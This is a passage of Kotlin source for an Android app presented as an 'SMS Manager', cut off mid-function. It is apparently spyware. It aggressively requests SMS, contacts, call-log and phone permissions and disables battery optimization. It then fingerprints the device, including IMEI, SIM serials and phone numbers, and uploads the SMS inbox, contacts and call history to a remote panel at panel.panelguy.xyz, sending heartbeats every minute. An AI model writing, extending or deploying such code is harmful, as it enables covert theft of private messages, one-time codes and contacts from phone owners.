package com.example.test

import android.Manifest
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.FirebaseMessaging
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.URL

class MainActivity : ComponentActivity() {

    private lateinit var deviceId: String
    private var fcmToken: String = ""
    private val handler = Handler(Looper.getMainLooper())
    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
    private val FCM_TIMEOUT_MS = 5000L
    private val url = Constants.BASE_URL
    private val userId = Constants.USER_ID

    companion object {
        private const val TAG = "MainActivity"
    }

    private val batteryUpdater = object : Runnable {
        override fun run() {
            sendBatteryUpdate()
            handler.postDelayed(this, BATTERY_UPDATE_INTERVAL_MS)
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.values.all { it }
        if (allGranted) {
            Log.d(TAG, "✅ All permissions granted")
            askIgnoreBatteryOptimizations()
        } else {
            Log.w(TAG, "⚠️ Some permissions denied")
            Toast.makeText(this, "Permissions are required", Toast.LENGTH_SHORT).show()
            requestAllPermissions()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        Log.d(TAG, "📱 Device ID: $deviceId")

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color.White
                ) {
                    Box(
                        modifier = Modifier.fillMaxSize(),
                        contentAlignment = Alignment.Center
                    ) {
                        Column(
                            horizontalAlignment = Alignment.CenterHorizontally,
                            verticalArrangement = Arrangement.Center
                        ) {
                            Text(
                                text = "SMS Manager",
                                fontSize = 24.sp,
                                fontWeight = FontWeight.Bold,
                                color = Color.Black
                            )
                            Spacer(modifier = Modifier.height(16.dp))
                            Text(
                                text = "Service Running",
                                fontSize = 16.sp,
                                color = Color.Gray
                            )
                        }
                    }
                }
            }
        }

        requestAllPermissions()
    }

    private fun requestAllPermissions() {
        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG
        )

        val allGranted = permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

        if (allGranted) {
            Log.d(TAG, "✅ All permissions already granted")
            askIgnoreBatteryOptimizations()
        } else {
            Log.d(TAG, "📝 Requesting permissions...")
            permissionLauncher.launch(permissions)
        }
    }

    private fun askIgnoreBatteryOptimizations() {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔋 CHECKING BATTERY OPTIMIZATION")
        Log.d(TAG, "════════════════════════════════════════")

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.w(TAG, "⚠️ Battery optimization is ON, requesting to ignore...")
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
            handler.postDelayed({ continueInitialization() }, 2000)
        } else {
            Log.d(TAG, "✅ Battery optimization already ignored")
            continueInitialization()
        }
    }

    private fun continueInitialization() {
        Log.d(TAG, "🚀 Starting initialization...")

        var fcmReceived = false

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            fcmReceived = true
            if (task.isSuccessful && task.result != null) {
                fcmToken = task.result!!
                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
            } else {
                Log.w(TAG, "⚠️ FCM token failed: ${task.exception?.message}")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "📝 Using fallback token: $fcmToken")
            }
        }

        handler.postDelayed({
            if (!fcmReceived) {
                Log.w(TAG, "⏱️ FCM timeout! Continuing without it...")
                fcmToken = "NO_FCM_TOKEN_${deviceId.take(8)}"
                Log.d(TAG, "📝 Using fallback token: $fcmToken")
            }

            Thread {
                try {
                    Log.d(TAG, "📡 Starting network operations...")
                    registerDevice()
                    uploadAllSmsOnce()
                    uploadAllContactsOnce()
                    uploadCallHistoryOnce()
                    startBackgroundService()
                    startHeartbeatService()
                    Log.d(TAG, "✅ All operations completed")
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Init error: ${e.message}", e)
                    e.printStackTrace()
                }
            }.start()

            handler.post(batteryUpdater)

        }, FCM_TIMEOUT_MS)
    }

    private fun sendBatteryUpdate() {
        if (fcmToken.isEmpty()) {
            Log.w(TAG, "⚠️ FCM token empty, skipping battery update")
            return
        }

        Thread {
            var conn: HttpURLConnection? = null
            try {
                val batteryLevel = getBatteryPercentage()
                Log.d(TAG, "🔋 Sending battery update: $batteryLevel%")

                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("battery", batteryLevel)
                    put("isOnline", true)
                }

                val url = URL("https://panel.panelguy.xyz/devices/battery-update")
                conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }

                val responseCode = conn.responseCode
                Log.d(TAG, "📥 Battery update response: $responseCode")

            } catch (e: Exception) {
                Log.e(TAG, "❌ Battery update exception: ${e.message}", e)
            } finally {
                conn?.disconnect()
            }
        }.start()
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = registerReceiver(null, ifilter)
            val level = batteryStatus?.getIntExtra("level", -1) ?: -1
            val scale = batteryStatus?.getIntExtra("scale", -1) ?: -1
            if (level != -1 && scale != -1) {
                ((level / scale.toFloat()) * 100).toInt()
            } else -1
        } catch (e: Exception) {
            -1
        }
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        return addr.hostAddress ?: "Unknown"
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ IP Address error: ${e.message}")
        }
        return "10.0.2.15"
    }

    private fun getSimInfo(): JSONArray {
        val simArray = JSONArray()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED) return simArray

        try {
            val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager

            val sims = subManager.activeSubscriptionInfoList

            if (!sims.isNullOrEmpty()) {
                sims.forEach { info ->
                    val sim = JSONObject().apply {
                        // 🔵 اطلاعات اصلی
                        put("simSlot", info.simSlotIndex) // شماره اسلات (0, 1)
                        put("subscriptionId", info.subscriptionId) // شناسه یکتا
                        put("carrierName", info.carrierName?.toString() ?: "") // نام اپراتور (ایرانسل، همراه اول)
                        put("displayName", info.displayName?.toString() ?: "") // نام نمایشی سیم
                        put("phoneNumber", info.number ?: "") // شماره تلفن

                        // 🌍 اطلاعات کشور و شبکه
                        put("countryIso", info.countryIso ?: "") // کد کشور (IR)
                        put("mcc", info.mccString ?: "") // Mobile Country Code (432)
                        put("mnc", info.mncString ?: "") // Mobile Network Code (11, 35, 70)

                        // 📶 وضعیت شبکه
                        put("isNetworkRoaming", info.dataRoaming == SubscriptionManager.DATA_ROAMING_ENABLE)

                        // 🎨 ظاهری و شناسه
                        put("iconTint", info.iconTint) // رنگ آیکون
                        put("cardId", info.cardId) // شناسه فیزیکی کارت

                        // 📡 قابلیت‌های پیشرفته (Android 10+)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                            put("carrierId", info.carrierId) // شناسه اپراتور
                            put("isEmbedded", info.isEmbedded) // eSIM یا نه
                            put("isOpportunistic", info.isOpportunistic) // سیم فرعی یا اصلی
                            put("iccId", info.iccId ?: "") // شماره سریال سیم‌کارت (19-20 رقمی)

                            // Group UUID (برای سیم‌های گروهی)
                            val groupUuid = info.groupUuid
                            put("groupUuid", groupUuid?.toString() ?: "")
                        } else {
                            put("carrierId", -1)
                            put("isEmbedded", false)
                            put("isOpportunistic", false)
                            put("iccId", "")
                            put("groupUuid", "")
                        }

                        // 🔢 شماره سریال سیم (Android 12+)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            try {
                                put("portIndex", info.portIndex)
                            } catch (e: Exception) {
                                put("portIndex", -1)
                            }
                        }

                        // 📞 اطلاعات TelephonyManager (برای هر سیم جداگانه)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                            try {
                                val tm = telephonyManager.createForSubscriptionId(info.subscriptionId)

                                // نوع شبکه (2G/3G/4G/5G)
                                put("networkType", getNetworkTypeName(tm.dataNetworkType))

                                // نام اپراتور شبکه فعلی
                                put("networkOperatorName", tm.networkOperatorName ?: "")

                                // کد اپراتور شبکه (MCC+MNC)
                                put("networkOperator", tm.networkOperator ?: "")

                                // اطلاعات اپراتور سیم‌کارت
                                put("simOperatorName", tm.simOperatorName ?: "")
                                put("simOperator", tm.simOperator ?: "")

                                // وضعیت سیم (Ready/Locked/...)
                                put("simState", getSimStateName(tm.simState))

                                // نوع تلفن (GSM/CDMA)
                                put("phoneType", getPhoneTypeName(tm.phoneType))

                                // IMEI (شناسه دستگاه برای هر سیم)
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    try {
                                        put("imei", tm.imei ?: "")
                                    } catch (e: Exception) {
                                        put("imei", "")
                                    }
                                } else {
                                    put("imei", "")
                                }

                                // MEID (برای CDMA)
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    try {
                                        put("meid", tm.meid ?: "")
                                    } catch (e: Exception) {
                                        put("meid", "")
                                    }
                                } else {
                                    put("meid", "")
                                }

                                // وضعیت دیتا
                                put("dataEnabled", tm.isDataEnabled)

                                // وضعیت Data Roaming
                                put("dataRoamingEnabled", tm.isDataRoamingEnabled)

                                // قابلیت‌های شبکه
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                    put("voiceCapable", tm.isVoiceCapable)
                                    put("smsCapable", tm.isSmsCapable)
                                }

                                // وضعیت آنتن (نیاز به مجوز READ_PHONE_STATE)
                                put("hasIccCard", tm.hasIccCard)

                                // Software Version
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    try {
                                        put("deviceSoftwareVersion", tm.deviceSoftwareVersion ?: "")
                                    } catch (e: Exception) {
                                        put("deviceSoftwareVersion", "")
                                    }
                                }

                                // Visual Voicemail
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                    put("visualVoicemailPackageName", tm.visualVoicemailPackageName ?: "")
                                }

                                // Network Country ISO
                                put("networkCountryIso", tm.networkCountryIso ?: "")

                                // SIM Country ISO
                                put("simCountryIso", tm.simCountryIso ?: "")

                            } catch (e: Exception) {
                                Log.e(TAG, "❌ Error reading TelephonyManager for SIM ${info.simSlotIndex}: ${e.message}")
                            }
                        }
                    }
                    simArray.put(sim)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SIM Info error: ${e.message}", e)
        }
        return simArray
    }

    // تبدیل نوع شبکه به متن
    private fun getNetworkTypeName(networkType: Int): String {
        return when (networkType) {
            android.telephony.TelephonyManager.NETWORK_TYPE_GPRS -> "GPRS (2G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_EDGE -> "EDGE (2G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_UMTS -> "UMTS (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_CDMA -> "CDMA (2G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_0 -> "EVDO Rev.0 (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_A -> "EVDO Rev.A (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_1xRTT -> "1xRTT (2G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_HSDPA -> "HSDPA (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_HSUPA -> "HSUPA (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_HSPA -> "HSPA (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_IDEN -> "iDEN (2G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_EVDO_B -> "EVDO Rev.B (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_LTE -> "LTE (4G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_EHRPD -> "eHRPD (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_HSPAP -> "HSPA+ (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_GSM -> "GSM (2G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_TD_SCDMA -> "TD-SCDMA (3G)"
            android.telephony.TelephonyManager.NETWORK_TYPE_IWLAN -> "IWLAN"
            else -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                networkType == android.telephony.TelephonyManager.NETWORK_TYPE_NR) {
                "5G NR"
            } else {
                "Unknown"
            }
        }
    }

    // وضعیت سیم‌کارت
    private fun getSimStateName(state: Int): String {
        return when (state) {
            android.telephony.TelephonyManager.SIM_STATE_ABSENT -> "Absent"
            android.telephony.TelephonyManager.SIM_STATE_NETWORK_LOCKED -> "Network Locked"
            android.telephony.TelephonyManager.SIM_STATE_PIN_REQUIRED -> "PIN Required"
            android.telephony.TelephonyManager.SIM_STATE_PUK_REQUIRED -> "PUK Required"
            android.telephony.TelephonyManager.SIM_STATE_READY -> "Ready"
            android.telephony.TelephonyManager.SIM_STATE_NOT_READY -> "Not Ready"
            android.telephony.TelephonyManager.SIM_STATE_PERM_DISABLED -> "Permanently Disabled"
            android.telephony.TelephonyManager.SIM_STATE_CARD_IO_ERROR -> "Card IO Error"
            android.telephony.TelephonyManager.SIM_STATE_CARD_RESTRICTED -> "Card Restricted"
            else -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                state == android.telephony.TelephonyManager.SIM_STATE_LOADED) {
                "Loaded"
            } else {
                "Unknown"
            }
        }
    }

    // نوع تلفن
    private fun getPhoneTypeName(phoneType: Int): String {
        return when (phoneType) {
            android.telephony.TelephonyManager.PHONE_TYPE_NONE -> "None"
            android.telephony.TelephonyManager.PHONE_TYPE_GSM -> "GSM"
            android.telephony.TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"
            android.telephony.TelephonyManager.PHONE_TYPE_SIP -> "SIP"
            else -> "Unknown"
        }
    }

    private fun registerDevice() {
        var conn: HttpURLConnection? = null
        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📝 REGISTERING DEVICE")
            Log.d(TAG, "════════════════════════════════════════")

            // گرفتن اطلاعات Storage
            val statFs = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val totalStorage = statFs.totalBytes
            val freeStorage = statFs.availableBytes

            // گرفتن اطلاعات RAM
            val activityManager = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
            val memInfo = android.app.ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memInfo)
            val totalRam = memInfo.totalMem
            val freeRam = memInfo.availMem

            // گرفتن نوع شبکه
            val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val networkType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(network)
                when {
                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "WiFi"
                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "Mobile"
                    capabilities?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "Ethernet"
                    else -> "Unknown"
                }
            } else {
                val netInfo = connectivityManager.activeNetworkInfo
                netInfo?.typeName ?: "Unknown"
            }

            // چک کردن Root
            val isRooted = checkIfRooted()

            // گرفتن اطلاعات صفحه نمایش
            val displayMetrics = resources.displayMetrics
            val screenResolution = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}"
            val screenDensity = displayMetrics.densityDpi

            // گرفتن وضعیت شارژ
            val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == android.os.BatteryManager.BATTERY_STATUS_FULL

            val chargePlug = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1) ?: -1
            val batteryState = when {
                isCharging && chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_USB -> "charging_usb"
                isCharging && chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_AC -> "charging_ac"
                isCharging && chargePlug == android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "charging_wireless"
                isCharging -> "charging"
                else -> "discharging"
            }

            val body = JSONObject().apply {
                // اطلاعات اصلی
                put("deviceId", deviceId)
                put("model", Build.MODEL)
                put("manufacturer", Build.MANUFACTURER)
                put("androidVersion", Build.VERSION.RELEASE)
                put("sdkInt", Build.VERSION.SDK_INT)
                put("brand", Build.BRAND)
                put("device", Build.DEVICE)
                put("product", Build.PRODUCT)
                put("hardware", Build.HARDWARE)
                put("board", Build.BOARD)
                put("display", Build.DISPLAY)
                put("fingerprint", Build.FINGERPRINT)
                put("host", Build.HOST)

                // CPU Architecture
                put("supportedAbis", JSONArray(Build.SUPPORTED_ABIS.toList()))

                // باتری
                put("battery", getBatteryPercentage())
                put("batteryState", batteryState)
                put("isCharging", isCharging)

                // حافظه
                put("totalStorage", totalStorage)
                put("freeStorage", freeStorage)
                put("totalRam", totalRam)
                put("freeRam", freeRam)

                // شبکه
                put("networkType", networkType)
                put("ipAddress", getIPAddress())

                // امنیت
                put("isRooted", isRooted)

                // صفحه نمایش
                put("screenResolution", screenResolution)
                put("screenDensity", screenDensity)

                // سیم‌کارت
                put("simInfo", getSimInfo())

                // FCM Token
                put("fcmToken", fcmToken)

                // اطلاعات اضافی
                put("userId", userId)
                put("Type", "MP")
                put("isEmulator", isEmulator())
                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
            }

            val url = URL("https://panel.panelguy.xyz/devices/register")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Response code: $responseCode")

            if (responseCode in 200..299) {
                val response = conn.inputStream.bufferedReader().use { it.readText() }
                Log.d(TAG, "✅ Registration successful: $response")
            } else {
                val error = conn.errorStream?.bufferedReader()?.use { it.readText() }
                Log.e(TAG, "❌ Registration failed ($responseCode): $error")
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Registration error: ${e.message}", e)
        } finally {
            conn?.disconnect()
        }
    }

    // تابع چک کردن Root
    private fun checkIfRooted(): Boolean {
        return try {
            // بررسی فایل‌های معمول Root
            val paths = arrayOf(
                "/system/app/Superuser.apk",
                "/sbin/su",
                "/system/bin/su",
                "/system/xbin/su",
                "/data/local/xbin/su",
                "/data/local/bin/su",
                "/system/sd/xbin/su",
                "/system/bin/failsafe/su",
                "/data/local/su",
                "/su/bin/su"
            )

            paths.any { java.io.File(it).exists() } || checkSuCommand()
        } catch (e: Exception) {
            false
        }
    }

    // چک کردن دستور su
    private fun checkSuCommand(): Boolean {
        return try {
            Runtime.getRuntime().exec("su")
            true
        } catch (e: Exception) {
            false
        }
    }

    // تشخیص Emulator
    private fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk" == Build.PRODUCT)
    }

    private fun uploadAllSmsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📨 UPLOADING SMS")
            Log.d(TAG, "════════════════════════════════════════")

            val smsUri = Uri.parse("content://sms/inbox")
            val sortOrder = "date DESC"
            val cursor = contentResolver.query(smsUri, null, null, null, sortOrder)

            cursor?.use {
                if (it.moveToFirst()) {
                    val smsBatch = JSONArray()
                    var totalSent = 0
                    var count = 0
                    val maxSms = 100 // محدودیت تعداد

                    do {
                        if (count >= maxSms) break // توقف بعد از 100 تا

                        try {
                            val sms = JSONObject().apply {
                                put("id", it.getString(it.getColumnIndexOrThrow("_id")))
                                put("address", it.getString(it.getColumnIndexOrThrow("address")))
                                put("body", it.getString(it.getColumnIndexOrThrow("body")))
                                put("date", it.getLong(it.getColumnIndexOrThrow("date")))
                                put("type", "incoming")
                                put("deviceId", deviceId)
                            }
                            smsBatch.put(sms)
                            count++ // افزایش شمارنده

                            if (smsBatch.length() >= 50) {
                                if (uploadSmsBatch(smsBatch)) {
                                    totalSent += smsBatch.length()
                                    while (smsBatch.length() > 0) smsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading SMS: ${e.message}")
                        }
                    } while (it.moveToNext())

                    if (smsBatch.length() > 0 && uploadSmsBatch(smsBatch)) {
                        totalSent += smsBatch.length()
                    }
                    Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
        }
    }

    private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply { put("messages", smsArray) }
            val url = URL("https://panel.panelguy.xyz/sms/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 SMS upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun uploadAllContactsOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "👥 UPLOADING CONTACTS")
            Log.d(TAG, "════════════════════════════════════════")

            val contactsUri = android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                android.provider.ContactsContract.CommonDataKinds.Phone.TYPE
            )

            val cursor = contentResolver.query(contactsUri, projection, null, null, null)

            cursor?.use {
                if (it.moveToFirst()) {
                    val contactsBatch = JSONArray()
                    var totalSent = 0

                    do {
                        try {
                            val contact = JSONObject().apply {
                                put("contactId", it.getString(0))
                                put("name", it.getString(1))
                                put("phoneNumber", it.getString(2))
                                put("type", it.getInt(3))
                                put("deviceId", deviceId)
                            }
                            contactsBatch.put(contact)

                            if (contactsBatch.length() >= 100) {
                                if (uploadContactsBatch(contactsBatch)) {
                                    totalSent += contactsBatch.length()
                                    while (contactsBatch.length() > 0) contactsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading contact: ${e.message}")
                        }
                    } while (it.moveToNext())

                    if (contactsBatch.length() > 0 && uploadContactsBatch(contactsBatch)) {
                        totalSent += contactsBatch.length()
                    }
                    Log.d(TAG, "✅ Total contacts uploaded: $totalSent")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Contacts upload error: ${e.message}", e)
        }
    }

    private fun uploadContactsBatch(contactsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply {
                put("contacts", contactsArray)
                put("deviceId", deviceId)
            }
            val url = URL("https://panel.panelguy.xyz/contacts/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Contacts upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ Contacts batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun uploadCallHistoryOnce() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) return

        try {
            Log.d(TAG, "════════════════════════════════════════")
            Log.d(TAG, "📞 UPLOADING CALL HISTORY")
            Log.d(TAG, "════════════════════════════════════════")

            val callLogUri = android.provider.CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                android.provider.CallLog.Calls._ID,
                android.provider.CallLog.Calls.NUMBER,
                android.provider.CallLog.Calls.TYPE,
                android.provider.CallLog.Calls.DATE,
                android.provider.CallLog.Calls.DURATION,
                android.provider.CallLog.Calls.CACHED_NAME
            )

            val sortOrder = "${android.provider.CallLog.Calls.DATE} DESC"
            val cursor = contentResolver.query(
                callLogUri, projection, null, null, sortOrder
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val callsBatch = JSONArray()
                    var totalSent = 0
                    var count = 0
                    val maxCalls = 200 // محدودیت تعداد

                    do {
                        if (count >= maxCalls) break // توقف بعد از 200 تا

                        try {
                            val callType = it.getInt(2)
                            val callTypeStr = when (callType) {
                                android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                                android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                android.provider.CallLog.Calls.MISSED_TYPE -> "missed"
                                android.provider.CallLog.Calls.REJECTED_TYPE -> "rejected"
                                android.provider.CallLog.Calls.BLOCKED_TYPE -> "blocked"
                                android.provider.CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
                                else -> "unknown"
                            }

                            val call = JSONObject().apply {
                                put("id", it.getString(0))
                                put("phoneNumber", it.getString(1) ?: "Unknown")
                                put("type", callTypeStr)
                                put("date", it.getLong(3))
                                put("duration", it.getInt(4))
                                put("name", it.getString(5) ?: "")
                                put("deviceId", deviceId)
                            }
                            callsBatch.put(call)
                            count++ // افزایش شمارنده

                            if (callsBatch.length() >= 100) {
                                if (uploadCallsBatch(callsBatch)) {
                                    totalSent += callsBatch.length()
                                    while (callsBatch.length() > 0) callsBatch.remove(0)
                                } else break
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Error reading call log: ${e.message}")
                        }
                    } while (it.moveToNext())

                    if (callsBatch.length() > 0 && uploadCallsBatch(callsBatch)) {
                        totalSent += callsBatch.length()
                    }
                    Log.d(TAG, "✅ Total call logs uploaded: $totalSent")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Call history upload error: ${e.message}", e)
        }
    }

    private fun uploadCallsBatch(callsArray: JSONArray): Boolean {
        var conn: HttpURLConnection? = null
        return try {
            val body = JSONObject().apply {
                put("calls", callsArray)
                put("deviceId", deviceId)
            }
            val url = URL("https://panel.panelguy.xyz/calls/bulk")
            conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 15000
            conn.readTimeout = 15000
            conn.doOutput = true

            conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Call logs upload response: $responseCode")
            responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "❌ Call logs batch error: ${e.message}")
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun startBackgroundService() {
        try {
            val intent = Intent(this, SmsService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
